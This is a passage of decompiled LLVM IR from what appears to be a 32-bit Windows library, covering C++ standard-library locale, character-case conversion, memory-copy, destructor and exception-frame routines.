dec_label_pc_100015b0:
  %eax.0.reg2mem = alloca i32, !insn.addr !196
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-16 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !197
  store i32 %1, i32* %stack_var_-16, align 4, !insn.addr !198
  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !199
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !200
  %3 = add i32 %0, 4, !insn.addr !201
  %4 = inttoptr i32 %3 to i32*, !insn.addr !201
  %5 = load i32, i32* %4, align 4, !insn.addr !201
  %6 = icmp eq i32 %5, 0, !insn.addr !202
  store i32 %2, i32* %eax.0.reg2mem, !insn.addr !203
  br i1 %6, label %dec_label_pc_100015ea, label %dec_label_pc_100015d9, !insn.addr !203

dec_label_pc_100015d9:                            ; preds = %dec_label_pc_100015b0
  %7 = inttoptr i32 %5 to i32*, !insn.addr !204
  %8 = load i32, i32* %7, align 4, !insn.addr !204
  store i32 %8, i32* %eax.0.reg2mem
  br label %dec_label_pc_100015ea

dec_label_pc_100015ea:                            ; preds = %dec_label_pc_100015d9, %dec_label_pc_100015b0
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %9 = load i32, i32* %stack_var_-16, align 4, !insn.addr !205
  call void @__writefsdword(i32 0, i32 %9), !insn.addr !206
  ret i32 %eax.0.reload, !insn.addr !207
}

define i8* @"?c_str@locale@std@@QBEPBDXZ"() local_unnamed_addr {
dec_label_pc_10001600:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !208
  %2 = inttoptr i32 %1 to i32*, !insn.addr !208
  %3 = load i32, i32* %2, align 4, !insn.addr !208
  %4 = icmp eq i32 %3, 0, !insn.addr !209
  %5 = icmp eq i1 %4, false, !insn.addr !210
  br i1 %5, label %dec_label_pc_1000160d, label %dec_label_pc_10001607, !insn.addr !210

dec_label_pc_10001607:                            ; preds = %dec_label_pc_10001600
  ret i8* bitcast (i8** @global_var_10039150 to i8*), !insn.addr !211

dec_label_pc_1000160d:                            ; preds = %dec_label_pc_10001600
  %6 = add i32 %3, 24, !insn.addr !212
  %7 = inttoptr i32 %6 to i32*, !insn.addr !212
  %8 = load i32, i32* %7, align 4, !insn.addr !212
  %9 = icmp eq i32 %8, 0, !insn.addr !213
  br i1 %9, label %dec_label_pc_10001617, label %dec_label_pc_10001614, !insn.addr !214

dec_label_pc_10001614:                            ; preds = %dec_label_pc_1000160d
  %10 = inttoptr i32 %8 to i8*, !insn.addr !215
  ret i8* %10, !insn.addr !215

dec_label_pc_10001617:                            ; preds = %dec_label_pc_1000160d
  %11 = add i32 %3, 28, !insn.addr !216
  %12 = inttoptr i32 %11 to i8*, !insn.addr !217
  ret i8* %12, !insn.addr !217
}

define i32* @"?_Getfacet@locale@std@@QBEPBVfacet@12@I@Z"(i32* %result, i32 %arg2) local_unnamed_addr {
dec_label_pc_10001620:
  %eax.1.reg2mem = alloca i32, !insn.addr !218
  %eax.0.reg2mem = alloca i32, !insn.addr !218
  %0 = ptrtoint i32* %result to i32
  %1 = add i32 %0, 4, !insn.addr !219
  %2 = inttoptr i32 %1 to i32*, !insn.addr !219
  %3 = load i32, i32* %2, align 4, !insn.addr !219
  %4 = add i32 %3, 12, !insn.addr !220
  %5 = inttoptr i32 %4 to i32*, !insn.addr !220
  %6 = load i32, i32* %5, align 4, !insn.addr !220
  %7 = icmp ugt i32 %6, %arg2, !insn.addr !220
  %8 = icmp eq i1 %7, false, !insn.addr !221
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !221
  br i1 %8, label %dec_label_pc_1000163d, label %dec_label_pc_1000162f, !insn.addr !221

dec_label_pc_1000162f:                            ; preds = %dec_label_pc_10001620
  %9 = add i32 %3, 8, !insn.addr !222
  %10 = inttoptr i32 %9 to i32*, !insn.addr !222
  %11 = load i32, i32* %10, align 4, !insn.addr !222
  %12 = mul i32 %arg2, 4, !insn.addr !223
  %13 = add i32 %11, %12, !insn.addr !223
  %14 = inttoptr i32 %13 to i32*, !insn.addr !223
  %15 = load i32, i32* %14, align 4, !insn.addr !223
  %16 = icmp eq i32 %15, 0, !insn.addr !224
  %17 = icmp eq i1 %16, false, !insn.addr !225
  store i32 %15, i32* %eax.0.reg2mem, !insn.addr !225
  store i32 %15, i32* %eax.1.reg2mem, !insn.addr !225
  br i1 %17, label %dec_label_pc_1000165a, label %dec_label_pc_1000163d, !insn.addr !225

dec_label_pc_1000163d:                            ; preds = %dec_label_pc_10001620, %dec_label_pc_1000162f
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %18 = add i32 %3, 20, !insn.addr !226
  %19 = inttoptr i32 %18 to i8*, !insn.addr !226
  %20 = load i8, i8* %19, align 1, !insn.addr !226
  %21 = icmp eq i8 %20, 0, !insn.addr !226
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !227
  br i1 %21, label %dec_label_pc_1000165a, label %dec_label_pc_10001643, !insn.addr !227

dec_label_pc_10001643:                            ; preds = %dec_label_pc_1000163d
  %22 = call i32 @function_1000e50f(), !insn.addr !228
  %23 = add i32 %22, 12, !insn.addr !229
  %24 = inttoptr i32 %23 to i32*, !insn.addr !229
  %25 = load i32, i32* %24, align 4, !insn.addr !229
  %26 = icmp ugt i32 %25, %arg2, !insn.addr !229
  %27 = icmp eq i1 %26, false, !insn.addr !230
  store i32 0, i32* %eax.1.reg2mem, !insn.addr !230
  br i1 %27, label %dec_label_pc_1000165a, label %dec_label_pc_1000164d, !insn.addr !230

dec_label_pc_1000164d:                            ; preds = %dec_label_pc_10001643
  %28 = add i32 %22, 8, !insn.addr !231
  %29 = inttoptr i32 %28 to i32*, !insn.addr !231
  %30 = load i32, i32* %29, align 4, !insn.addr !231
  %31 = mul i32 %arg2, 4, !insn.addr !232
  %32 = add i32 %30, %31, !insn.addr !232
  %33 = inttoptr i32 %32 to i32*, !insn.addr !232
  %34 = load i32, i32* %33, align 4, !insn.addr !232
  %35 = inttoptr i32 %34 to i32*, !insn.addr !233
  ret i32* %35, !insn.addr !233

dec_label_pc_1000165a:                            ; preds = %dec_label_pc_10001643, %dec_label_pc_1000163d, %dec_label_pc_1000162f
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %36 = inttoptr i32 %eax.1.reload to i32*, !insn.addr !234
  ret i32* %36, !insn.addr !234
}

define i32 @function_10001660(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10001660:
  %ecx.0.reg2mem = alloca i32, !insn.addr !235
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !236
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !237
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !238
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !239
  %2 = icmp eq i32 %arg2, 0, !insn.addr !240
  br i1 %2, label %dec_label_pc_10001712, label %dec_label_pc_100016a9, !insn.addr !241

dec_label_pc_100016a9:                            ; preds = %dec_label_pc_10001660
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !242
  %4 = load i32, i32* %3, align 4, !insn.addr !242
  %5 = icmp eq i32 %4, 0, !insn.addr !242
  %6 = icmp eq i1 %5, false, !insn.addr !243
  br i1 %6, label %dec_label_pc_10001712, label %dec_label_pc_100016ae, !insn.addr !243

dec_label_pc_100016ae:                            ; preds = %dec_label_pc_100016a9
  %7 = call i32 @"??2@YAPAXI@Z"(i32 24), !insn.addr !244
  %8 = add i32 %arg3, 4, !insn.addr !245
  %9 = inttoptr i32 %8 to i32*, !insn.addr !245
  %10 = load i32, i32* %9, align 4, !insn.addr !245
  %11 = icmp eq i32 %10, 0, !insn.addr !246
  %12 = icmp eq i1 %11, false, !insn.addr !247
  store i32 ptrtoint (i8** @global_var_10039150 to i32), i32* %ecx.0.reg2mem, !insn.addr !247
  br i1 %12, label %dec_label_pc_100016d5, label %dec_label_pc_100016df, !insn.addr !247

dec_label_pc_100016d5:                            ; preds = %dec_label_pc_100016ae
  %13 = add i32 %10, 24, !insn.addr !248
  %14 = inttoptr i32 %13 to i32*, !insn.addr !248
  %15 = load i32, i32* %14, align 4, !insn.addr !248
  %16 = icmp eq i32 %15, 0, !insn.addr !249
  %17 = icmp eq i1 %16, false, !insn.addr !250
  %18 = add i32 %10, 28
  %spec.select = select i1 %17, i32 %15, i32 %18
  store i32 %spec.select, i32* %ecx.0.reg2mem
  br label %dec_label_pc_100016df

dec_label_pc_100016df:                            ; preds = %dec_label_pc_100016d5, %dec_label_pc_100016ae
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %19 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !251
  %20 = call i32 @"??0_Locinfo@std@@QAE@PBD@Z"(i32* nonnull %stack_var_-108, i8* %19), !insn.addr !252
  %21 = add i32 %7, 4, !insn.addr !253
  %22 = inttoptr i32 %21 to i32*, !insn.addr !253
  store i32 0, i32* %22, align 4, !insn.addr !253
  %23 = inttoptr i32 %7 to i32*, !insn.addr !254
  store i32 ptrtoint (i32* @global_var_1002d308 to i32), i32* %23, align 4, !insn.addr !254
  %24 = call i32 @__Getctype(i32* nonnull %stack_var_-56), !insn.addr !255
  %25 = inttoptr i32 %24 to i128*, !insn.addr !256
  %26 = load i128, i128* %25, align 4, !insn.addr !256
  %27 = call i128 @__asm_movups.35(i128 %26), !insn.addr !256
  %28 = add i32 %7, 8, !insn.addr !257
  %29 = inttoptr i32 %28 to i128*, !insn.addr !257
  %30 = load i128, i128* %29, align 4, !insn.addr !257
  call void @__asm_movups(i128 %30, i128 %27), !insn.addr !257
  store i32 %7, i32* %3, align 4, !insn.addr !258
  %31 = call i32 @"??1_Locinfo@std@@QAE@XZ"(), !insn.addr !259
  br label %dec_label_pc_10001712, !insn.addr !259

dec_label_pc_10001712:                            ; preds = %dec_label_pc_100016df, %dec_label_pc_100016a9, %dec_label_pc_10001660
  %32 = load i32, i32* %stack_var_-28, align 4, !insn.addr !260
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !261
  ret i32 2, !insn.addr !262
}

define i32 @function_10001730(i8 %arg1) local_unnamed_addr {
dec_label_pc_10001730:
  %0 = call i32 @__Tolower(), !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_10001750(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10001750:
  %esi.1.reg2mem = alloca i32, !insn.addr !265
  %edi.0.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-16 = alloca i32, align 4
  %1 = icmp ult i32 %arg2, %arg1
  %2 = select i1 %1, i32 %arg1, i32 %arg2
  %3 = sub i32 %2, %arg1
  %4 = icmp eq i32 %3, 0, !insn.addr !266
  store i32 %arg1, i32* %esi.1.reg2mem, !insn.addr !267
  br i1 %4, label %dec_label_pc_1000178a, label %dec_label_pc_1000176c, !insn.addr !267

dec_label_pc_1000176c:                            ; preds = %dec_label_pc_10001750
  %5 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !268
  %6 = add i32 %0, 8, !insn.addr !269
  %7 = add i32 %5, -4, !insn.addr !270
  %8 = inttoptr i32 %7 to i32*, !insn.addr !270
  %9 = add i32 %5, -8, !insn.addr !271
  %10 = inttoptr i32 %9 to i32*, !insn.addr !271
  store i32 %arg1, i32* %esi.0.reg2mem, !insn.addr !272
  store i32 0, i32* %edi.0.reg2mem, !insn.addr !272
  br label %dec_label_pc_10001772, !insn.addr !272

dec_label_pc_10001772:                            ; preds = %dec_label_pc_10001772, %dec_label_pc_1000176c
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  store i32 %6, i32* %8, align 4, !insn.addr !270
  %11 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !273
  %12 = load i8, i8* %11, align 1, !insn.addr !273
  %13 = zext i8 %12 to i32, !insn.addr !273
  store i32 %13, i32* %10, align 4, !insn.addr !271
  %14 = call i32 @__Tolower(), !insn.addr !274
  %15 = trunc i32 %14 to i8, !insn.addr !275
  store i8 %15, i8* %11, align 1, !insn.addr !275
  %16 = add i32 %edi.0.reload, 1, !insn.addr !276
  %17 = add i32 %esi.0.reload, 1, !insn.addr !277
  %18 = icmp eq i32 %16, %3, !insn.addr !278
  %19 = icmp eq i1 %18, false, !insn.addr !279
  store i32 %17, i32* %esi.0.reg2mem, !insn.addr !279
  store i32 %16, i32* %edi.0.reg2mem, !insn.addr !279
  store i32 %17, i32* %esi.1.reg2mem, !insn.addr !279
  br i1 %19, label %dec_label_pc_10001772, label %dec_label_pc_1000178a, !insn.addr !279

dec_label_pc_1000178a:                            ; preds = %dec_label_pc_10001772, %dec_label_pc_10001750
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  ret i32 %esi.1.reload, !insn.addr !280
}

define i32 @function_100017a0(i8 %arg1) local_unnamed_addr {
dec_label_pc_100017a0:
  %0 = call i32 @__Toupper(), !insn.addr !281
  ret i32 %0, !insn.addr !282
}

define i32 @function_100017c0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100017c0:
  %esi.1.reg2mem = alloca i32, !insn.addr !283
  %edi.0.reg2mem = alloca i32, !insn.addr !283
  %esi.0.reg2mem = alloca i32, !insn.addr !283
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-16 = alloca i32, align 4
  %1 = icmp ult i32 %arg2, %arg1
  %2 = select i1 %1, i32 %arg1, i32 %arg2
  %3 = sub i32 %2, %arg1
  %4 = icmp eq i32 %3, 0, !insn.addr !284
  store i32 %arg1, i32* %esi.1.reg2mem, !insn.addr !285
  br i1 %4, label %dec_label_pc_100017fa, label %dec_label_pc_100017dc, !insn.addr !285

dec_label_pc_100017dc:                            ; preds = %dec_label_pc_100017c0
  %5 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !286
  %6 = add i32 %0, 8, !insn.addr !287
  %7 = add i32 %5, -4, !insn.addr !288
  %8 = inttoptr i32 %7 to i32*, !insn.addr !288
  %9 = add i32 %5, -8, !insn.addr !289
  %10 = inttoptr i32 %9 to i32*, !insn.addr !289
  store i32 %arg1, i32* %esi.0.reg2mem, !insn.addr !290
  store i32 0, i32* %edi.0.reg2mem, !insn.addr !290
  br label %dec_label_pc_100017e2, !insn.addr !290

dec_label_pc_100017e2:                            ; preds = %dec_label_pc_100017e2, %dec_label_pc_100017dc
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  store i32 %6, i32* %8, align 4, !insn.addr !288
  %11 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !291
  %12 = load i8, i8* %11, align 1, !insn.addr !291
  %13 = zext i8 %12 to i32, !insn.addr !291
  store i32 %13, i32* %10, align 4, !insn.addr !289
  %14 = call i32 @__Toupper(), !insn.addr !292
  %15 = trunc i32 %14 to i8, !insn.addr !293
  store i8 %15, i8* %11, align 1, !insn.addr !293
  %16 = add i32 %edi.0.reload, 1, !insn.addr !294
  %17 = add i32 %esi.0.reload, 1, !insn.addr !295
  %18 = icmp eq i32 %16, %3, !insn.addr !296
  %19 = icmp eq i1 %18, false, !insn.addr !297
  store i32 %17, i32* %esi.0.reg2mem, !insn.addr !297
  store i32 %16, i32* %edi.0.reg2mem, !insn.addr !297
  store i32 %17, i32* %esi.1.reg2mem, !insn.addr !297
  br i1 %19, label %dec_label_pc_100017e2, label %dec_label_pc_100017fa, !insn.addr !297

dec_label_pc_100017fa:                            ; preds = %dec_label_pc_100017e2, %dec_label_pc_100017c0
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  ret i32 %esi.1.reload, !insn.addr !298
}

define i32 @function_10001810(i8 %arg1) local_unnamed_addr {
dec_label_pc_10001810:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = zext i8 %arg1 to i32, !insn.addr !299
  %2 = and i32 %0, -256, !insn.addr !299
  %3 = or i32 %2, %1, !insn.addr !299
  ret i32 %3, !insn.addr !300
}

define i32 @function_10001820(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10001820:
  %0 = call i32 @_memcpy.12(), !insn.addr !301
  ret i32 %arg2, !insn.addr !302
}

define i32 @function_10001840(i8 %arg1) local_unnamed_addr {
dec_label_pc_10001840:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = zext i8 %arg1 to i32, !insn.addr !303
  %2 = and i32 %0, -256, !insn.addr !303
  %3 = or i32 %2, %1, !insn.addr !303
  ret i32 %3, !insn.addr !304
}

define i32 @function_10001850(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10001850:
  %0 = call i32 @_memcpy.12(), !insn.addr !305
  ret i32 %arg2, !insn.addr !306
}

define i32 @function_10001870(i8 %arg1) local_unnamed_addr {
dec_label_pc_10001870:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !307
  %2 = inttoptr i32 %1 to i32*, !insn.addr !307
  %3 = load i32, i32* %2, align 4, !insn.addr !307
  %4 = inttoptr i32 %0 to i32*, !insn.addr !308
  store i32 ptrtoint (i32* @global_var_1002d308 to i32), i32* %4, align 4, !insn.addr !308
  %5 = icmp slt i32 %3, 1
  br i1 %5, label %dec_label_pc_1000188d, label %dec_label_pc_10001883, !insn.addr !309

dec_label_pc_10001883:                            ; preds = %dec_label_pc_10001870
  %6 = add i32 %0, 12, !insn.addr !310
  %7 = inttoptr i32 %6 to i32*, !insn.addr !310
  %8 = load i32, i32* %7, align 4, !insn.addr !310
  %9 = inttoptr i32 %8 to i32*, !insn.addr !311
  call void @_free(i32* %9), !insn.addr !311
  br label %dec_label_pc_1000189a, !insn.addr !312

dec_label_pc_1000188d:                            ; preds = %dec_label_pc_10001870
  %10 = icmp ne i32 %3, 0, !insn.addr !313
  %11 = icmp eq i1 %10, false, !insn.addr !314
  br i1 %11, label %dec_label_pc_1000189a, label %dec_label_pc_1000188f, !insn.addr !314

dec_label_pc_1000188f:                            ; preds = %dec_label_pc_1000188d
  %12 = call i32 @function_1000f4b1(), !insn.addr !315
  br label %dec_label_pc_1000189a, !insn.addr !315

dec_label_pc_1000189a:                            ; preds = %dec_label_pc_10001883, %dec_label_pc_1000188f, %dec_label_pc_1000188d
  %13 = add i32 %0, 20, !insn.addr !316
  %14 = inttoptr i32 %13 to i32*, !insn.addr !316
  %15 = load i32, i32* %14, align 4, !insn.addr !316
  %16 = inttoptr i32 %15 to i32*, !insn.addr !317
  call void @_free(i32* %16), !insn.addr !317
  store i32 ptrtoint (i32* @global_var_1002d2f8 to i32), i32* %4, align 4, !insn.addr !318
  %17 = and i8 %arg1, 1, !insn.addr !319
  %18 = icmp eq i8 %17, 0, !insn.addr !319
  br i1 %18, label %dec_label_pc_100018bc, label %dec_label_pc_100018b1, !insn.addr !320

dec_label_pc_100018b1:                            ; preds = %dec_label_pc_1000189a
  call void @"??3@YAXPAXI@Z"(i32* nonnull %4, i32 24), !insn.addr !321
  br label %dec_label_pc_100018bc, !insn.addr !322

dec_label_pc_100018bc:                            ; preds = %dec_label_pc_100018b1, %dec_label_pc_1000189a
  ret i32 %0, !insn.addr !323
}

define i32 @function_100018d0(i8 %arg1) {
dec_label_pc_100018d0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = and i8 %arg1, 1, !insn.addr !324
  %2 = icmp eq i8 %1, 0, !insn.addr !324
  %3 = inttoptr i32 %0 to i32*, !insn.addr !325
  store i32 ptrtoint (i32* @global_var_1002d338 to i32), i32* %3, align 4, !insn.addr !325
  br i1 %2, label %dec_label_pc_100018ed, label %dec_label_pc_100018e2, !insn.addr !326

dec_label_pc_100018e2:                            ; preds = %dec_label_pc_100018d0
  call void @"??3@YAXPAXI@Z"(i32* %3, i32 8), !insn.addr !327
  br label %dec_label_pc_100018ed, !insn.addr !328

dec_label_pc_100018ed:                            ; preds = %dec_label_pc_100018e2, %dec_label_pc_100018d0
  ret i32 %0, !insn.addr !329
}

define i32 @function_10001900(i32 %arg1) local_unnamed_addr {
dec_label_pc_10001900:
  ret i32 %arg1, !insn.addr !330
}

define i32 @function_10001930(i32 %arg1, i32 %arg2) {
dec_label_pc_10001930:
  %0 = inttoptr i32 %arg1 to i32*, !insn.addr !331
  store i32 %arg2, i32* %0, align 4, !insn.addr !331
  %1 = add i32 %arg1, 4, !insn.addr !332
  %2 = inttoptr i32 %1 to i32*, !insn.addr !332
  ret i32 %arg1, !insn.addr !333
}

define i32 @function_10001950(i32 %arg1, i32 %arg2) {
dec_label_pc_10001950:
  %eax.0.reg2mem = alloca i32, !insn.addr !334
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !335
  %2 = inttoptr i32 %1 to i32*, !insn.addr !335
  %3 = load i32, i32* %2, align 4, !insn.addr !335
  %4 = add i32 %arg2, 4, !insn.addr !336
  %5 = inttoptr i32 %4 to i32*, !insn.addr !336
  %6 = load i32, i32* %5, align 4, !insn.addr !336
  %7 = add i32 %3, 4, !insn.addr !337
  %8 = inttoptr i32 %7 to i32*, !insn.addr !337
  %9 = load i32, i32* %8, align 4, !insn.addr !337
  %10 = add i32 %6, 4, !insn.addr !338
  %11 = inttoptr i32 %10 to i32*, !insn.addr !338
  %12 = load i32, i32* %11, align 4, !insn.addr !338
  %13 = icmp eq i32 %9, %12, !insn.addr !338
  %14 = icmp eq i1 %13, false, !insn.addr !339
  br i1 %14, label %dec_label_pc_10001983, label %dec_label_pc_10001974, !insn.addr !339

dec_label_pc_10001974:                            ; preds = %dec_label_pc_10001950
  %15 = inttoptr i32 %arg2 to i32*, !insn.addr !340
  %16 = load i32, i32* %15, align 4, !insn.addr !340
  %17 = icmp eq i32 %9, %16, !insn.addr !340
  %18 = icmp eq i1 %17, false, !insn.addr !341
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !341
  br i1 %18, label %dec_label_pc_10001983, label %dec_label_pc_1000197a, !insn.addr !341

dec_label_pc_1000197a:                            ; preds = %dec_label_pc_10001974
  %19 = and i32 %9, -256, !insn.addr !342
  %20 = or i32 %19, 1, !insn.addr !342
  ret i32 %20, !insn.addr !343

dec_label_pc_10001983:                            ; preds = %dec_label_pc_10001974, %dec_label_pc_10001950
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %21 = and i32 %eax.0.reload, -256, !insn.addr !344
  ret i32 %21, !insn.addr !345
}

define i32 @function_10001990(i32 %arg1, i32 %arg2) {
dec_label_pc_10001990:
  %eax.0.reg2mem = alloca i32, !insn.addr !346
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !347
  %2 = inttoptr i32 %1 to i32*, !insn.addr !347
  %3 = load i32, i32* %2, align 4, !insn.addr !347
  %4 = add i32 %arg1, 4, !insn.addr !348
  %5 = inttoptr i32 %4 to i32*, !insn.addr !348
  %6 = load i32, i32* %5, align 4, !insn.addr !348
  %7 = add i32 %6, 4, !insn.addr !349
  %8 = inttoptr i32 %7 to i32*, !insn.addr !349
  %9 = load i32, i32* %8, align 4, !insn.addr !349
  %10 = icmp eq i32 %3, %9, !insn.addr !349
  %11 = icmp eq i1 %10, false, !insn.addr !350
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !350
  br i1 %11, label %dec_label_pc_100019b0, label %dec_label_pc_100019a2, !insn.addr !350

dec_label_pc_100019a2:                            ; preds = %dec_label_pc_10001990
  %12 = inttoptr i32 %arg1 to i32*, !insn.addr !351
  %13 = load i32, i32* %12, align 4, !insn.addr !351
  %14 = icmp eq i32 %13, %arg2, !insn.addr !352
  %15 = icmp eq i1 %14, false, !insn.addr !353
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !353
  br i1 %15, label %dec_label_pc_100019b0, label %dec_label_pc_100019a9, !insn.addr !353

dec_label_pc_100019a9:                            ; preds = %dec_label_pc_100019a2
  %16 = and i32 %13, -256, !insn.addr !354
  %17 = or i32 %16, 1, !insn.addr !354
  ret i32 %17, !insn.addr !355

dec_label_pc_100019b0:                            ; preds = %dec_label_pc_100019a2, %dec_label_pc_10001990
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %18 = and i32 %eax.0.reload, -256, !insn.addr !356
  ret i32 %18, !insn.addr !357
}

define i32 @function_100019c0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100019c0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @function_100066c0(i32 %0), !insn.addr !358
  %2 = add i32 %arg1, 4, !insn.addr !359
  %3 = inttoptr i32 %2 to i32*, !insn.addr !359
  store i32 %1, i32* %3, align 4, !insn.addr !359
  %4 = inttoptr i32 %arg1 to i32*, !insn.addr !360
  store i32 %arg2, i32* %4, align 4, !insn.addr !360
  ret i32 %arg1, !insn.addr !361
}

define i32 @function_100019e0(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100019e0:
  %ecx.0.reg2mem = alloca i32, !insn.addr !362
  %eax.1.reg2mem = alloca i32, !insn.addr !362
  %eax.0.reg2mem = alloca i32, !insn.addr !362
  %esp.0.reg2mem = alloca i32, !insn.addr !362
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-60 = alloca i8, align 1
  %stack_var_-84 = alloca i8*, align 4
  %1 = call i64 @__decompiler_undefined_function_6()
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !363
  %3 = call i32 @__readfsdword(i32 0), !insn.addr !364
  store i32 %3, i32* %stack_var_-28, align 4, !insn.addr !365
  %4 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !366
  %5 = xor i32 %4, %2, !insn.addr !367
  store i32 %5, i32* %stack_var_-76, align 4, !insn.addr !368
  %6 = ptrtoint i32* %stack_var_-76 to i32, !insn.addr !368
  %7 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !369
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !370
  %8 = trunc i64 %1 to i32, !insn.addr !371
  %9 = icmp eq i32 %8, 0, !insn.addr !371
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !372
  br i1 %9, label %dec_label_pc_10001a43, label %dec_label_pc_10001a34, !insn.addr !372

dec_label_pc_10001a34:                            ; preds = %dec_label_pc_100019e0
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10039198, i32 0, i32 0), i8** %stack_var_-84, align 4, !insn.addr !373
  %10 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !373
  %11 = call i32 @function_10005100(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10039198, i32 0, i32 0), i32 2), !insn.addr !374
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !374
  br label %dec_label_pc_10001a43, !insn.addr !374

dec_label_pc_10001a43:                            ; preds = %dec_label_pc_10001a34, %dec_label_pc_100019e0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %12 = add i32 %esp.0.reload, -4, !insn.addr !375
  %13 = inttoptr i32 %12 to i32*, !insn.addr !375
  %14 = ptrtoint i8* %stack_var_-60 to i32, !insn.addr !375
  store i32 %14, i32* %13, align 4, !insn.addr !375
  %15 = call i32 @function_10001900(i32 ptrtoint (i32* @1 to i32)), !insn.addr !376
  %16 = add i32 %esp.0.reload, -8, !insn.addr !377
  %17 = inttoptr i32 %16 to i32*, !insn.addr !377
  store i32 -1, i32* %17, align 4, !insn.addr !377
  %18 = add i32 %esp.0.reload, -12, !insn.addr !378
  %19 = inttoptr i32 %18 to i32*, !insn.addr !378
  store i32 0, i32* %19, align 4, !insn.addr !378
  %20 = add i32 %esp.0.reload, -16, !insn.addr !379
  %21 = inttoptr i32 %20 to i32*, !insn.addr !379
  store i32 %15, i32* %21, align 4, !insn.addr !379
  %22 = call i32 @function_100051f0(i8 1, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !380
  %23 = icmp ult i32 %0, 16, !insn.addr !381
  br i1 %23, label %dec_label_pc_10001aaa, label %dec_label_pc_10001a68, !insn.addr !382

dec_label_pc_10001a68:                            ; preds = %dec_label_pc_10001a43
  %24 = load i8, i8* %stack_var_-60, align 1, !insn.addr !383
  %25 = sext i8 %24 to i32, !insn.addr !383
  %26 = add i32 %0, 1, !insn.addr !384
  %27 = icmp ult i32 %26, 4096, !insn.addr !385
  store i32 %25, i32* %ecx.0.reg2mem, !insn.addr !386
  br i1 %27, label %dec_label_pc_10001aa1, label %dec_label_pc_10001a73, !insn.addr !386

dec_label_pc_10001a73:                            ; preds = %dec_label_pc_10001a68
  %28 = and i32 %25, 31
  %29 = icmp eq i32 %28, 0, !insn.addr !387
  br i1 %29, label %dec_label_pc_10001a7d, label %dec_label_pc_10001a78, !insn.addr !388

dec_label_pc_10001a78:                            ; preds = %dec_label_pc_10001a73
  %30 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !389
  br label %dec_label_pc_10001a7d, !insn.addr !389

dec_label_pc_10001a7d:                            ; preds = %dec_label_pc_10001a78, %dec_label_pc_10001a73
  %31 = add nsw i32 %25, -4, !insn.addr !390
  %32 = inttoptr i32 %31 to i32*, !insn.addr !390
  %33 = load i32, i32* %32, align 4, !insn.addr !390
  %34 = icmp ult i32 %33, %25, !insn.addr !391
  store i32 %33, i32* %eax.0.reg2mem, !insn.addr !392
